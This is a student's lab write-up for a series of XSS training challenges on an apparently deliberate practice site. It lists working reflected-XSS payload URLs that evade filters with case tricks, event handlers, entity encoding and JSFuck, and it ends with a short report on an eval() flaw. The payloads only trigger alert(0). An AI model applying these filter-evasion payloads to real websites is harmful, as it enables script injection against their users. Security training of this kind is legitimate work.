@@ -1,0 +1,55 @@
+Megh Vakharia
+meghv@uw.edu, 1220592
+
+Part 1 - Vulnerabilities
+===============================================
+challenge0: script tag is returned via username GET req
+http://xss-challenges.r7.io/0/login?username=%3Cscript%3Ealert(0)%3C/script%3E&password=Helo&user_language=english
+
+challenge1: use single quote and end-tag to get out of span tag
+http://xss-challenges.r7.io/1/login?username=%27%3E%3Cscript%3Ealert(0)%3C/script%3E&password=hello&user_language=english
+
+challenge2: break out of JS in language variable
+http://xss-challenges.r7.io/2/login?username=hello&password=test&user_language=%27;alert(0);%27
+
+challenge3: break out of JS in language variable
+http://xss-challenges.r7.io/3/login?username=hello&password=test&user_language=%27;alert(0);%27
+
+challenge4: “script” word is removed, but SCRIPT isn't
+http://xss-challenges.r7.io/4/login?username=%3CSCRIPT%3Ealert(0)%3C/SCRIPT%3E&password=test
+
+challenge5: “script” is turned into “x”, so SVG tag is used instead - onload has JS
+http://xss-challenges.r7.io/5/login?username=%3Csvg/onload=alert(0)%3E&password=hello&user_language=english
+
+challenge6: “script” is turned into “x”, so SVG tag is used instead - onload has JS
+http://xss-challenges.r7.io/6/login?username=%27%3E%3Csvg/onload=alert(0)%3E&password=hello
+
+challenge7: all < / > tags are converted to ASCII and ASCII input is not accepted. Unicode < / > are also automatically converted to the signs. Mouseover is used
+http://xss-challenges.r7.io/7/login?username=%27onmouseover=%27alert(0)%27A&password=hello&user_language=test
+
+challenge 8: ‘a’ is translated to &#, allowing us to turn it into ascii by inputting the ASCII number for ‘a’: (&#)97;
+http://xss-challenges.r7.io/8/login?username=%27onmouseover=%27a97;lert(0)%27&password=test
+
+challenge 9: a, l, t not allowed and ‘ is automatically inserted to end of value, but ascii symbols are correctly interpreted
+http://xss-challenges.r7.io/9/login?username=%27onmouseover=%26%2397;%26%23108;%26%23101;%26%23114;%26%23116;%26%2340;0%26%2341;%26%2359;z=%27&password=test#
+
+challenge 15: used http://www.jsfuck.com/ - no characters could be used, so i had to resort to the atomic parts of JS
+http://xss-challenges.r7.io/15/login?username=(!%5B%5D%2b%5B%5D)%5B%2b!%2b%5B%5D%5D%2b(!%5B%5D%2b%5B%5D)%5B!%2b%5B%5D%2b!%2b%5B%5D%5D%2b(!!%5B%5D%2b%5B%5D)%5B!%2b%5B%5D%2b!%2b%5B%5D%2b!%2b%5B%5D%5D%2b(!!%5B%5D%2b%5B%5D)%5B%2b!%2b%5B%5D%5D%2b(!!%5B%5D%2b%5B%5D)%5B%2b%5B%5D%5D%2b(!%5B%5D%2b%5B%5D%5B(!%5B%5D%2b%5B%5D)%5B%2b%5B%5D%5D%2b(%5B!%5B%5D%5D%2b%5B%5D%5B%5B%5D%5D)%5B%2b!%2b%5B%5D%2b%5B%2b%5B%5D%5D%5D%2b(!%5B%5D%2b%5B%5D)%5B!%2b%5B%5D%2b!%2b%5B%5D%5D%2b(!!%5B%5D%2b%5B%5D)%5B%2b%5B%5D%5D%2b(!!%5B%5D%2b%5B%5D)%5B!%2b%5B%5D%2b!%2b%5B%5D%2b!%2b%5B%5D%5D%2b(!!%5B%5D%2b%5B%5D)%5B%2b!%2b%5B%5D%5D%5D)%5B!%2b%5B%5D%2b!%2b%5B%5D%2b%5B%2b%5B%5D%5D%5D%2b%5B%2b%5B%5D%5D%2b(!!%5B%5D%2b%5B%5D%5B(!%5B%5D%2b%5B%5D)%5B%2b%5B%5D%5D%2b(%5B!%5B%5D%5D%2b%5B%5D%5B%5B%5D%5D)%5B%2b!%2b%5B%5D%2b%5B%2b%5B%5D%5D%5D%2b(!%5B%5D%2b%5B%5D)%5B!%2b%5B%5D%2b!%2b%5B%5D%5D%2b(!!%5B%5D%2b%5B%5D)%5B%2b%5B%5D%5D%2b(!!%5B%5D%2b%5B%5D)%5B!%2b%5B%5D%2b!%2b%5B%5D%2b!%2b%5B%5D%5D%2b(!!%5B%5D%2b%5B%5D)%5B%2b!%2b%5B%5D%5D%5D)%5B!%2b%5B%5D%2b!%2b%5B%5D%2b%5B%2b%5B%5D%5D%5D&password=test&user_language=english#
+
+Part 2 - The Report
+===============================================
+Description (challenge 15):
+The vulnerability is in the execution of the eval() function. eval will execute javascript that is passed inside of it. meaning anything that coming from the GET request is executed directly in eval, allowing an easy opportunity to add javascript.
+
+Test Steps:
+1) Pass 'alert(0)' into the username property. Note that on the resulting page, an eval() function is inside of a script tag. This eval function contains the passed-in text, alert(0), except all of the letter/number characters are stripped out, leaving the parentheses only: eval(()).
+2) Try passing in any number or letter and note that all of them are stripped out, meaning only certain special characters are allowed in, such as ! and ().
+3) Look at jsfuck.com to learn about JS' atomic properties - combinations of the characters !, (), and + can be used to logically represent letters and numbers, allowing the string 'alert(0)' to be recreated.
+4) Using jsfuck.com, you can get a representation of alert(0), but if you put it in and try to execute the page, you'll notice the + signs are stripped out.
+5) If you replace all of the + signs with their Unicode representation - %2b - you'll notice that they are represented on the page as a +. As such, you will be able to pass in 'alert(0)' by representing everything with atomic JS units and the Unicode for +.
+
+Further Reading:
+https://www.owasp.org/index.php/Alternate_XSS_Syntax
+https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#Image_XSS_using_the_JavaScript_directive
+jsfuck.com
